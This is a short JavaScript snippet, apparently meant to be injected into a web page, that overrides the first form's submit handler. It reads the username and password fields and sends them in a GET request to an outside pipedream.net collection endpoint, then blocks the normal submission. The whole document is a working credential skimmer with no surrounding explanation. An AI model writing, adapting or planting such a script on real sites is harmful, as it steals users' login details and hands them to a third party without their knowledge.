function intercept() {
 
 var user = document.forms[0].elements[7].value;
 var pass = document.forms[0].elements[8].value;
 
 
 var xhr = new XMLHttpRequest();
 
 xhr.open("GET", "https://279dab10553f3cfa470b9c9be00bca7f.m.pipedream.net?user="+user+"&password="+pass)
 xhr.send();
return false;
 }
 document.forms[0].onsubmit = intercept;
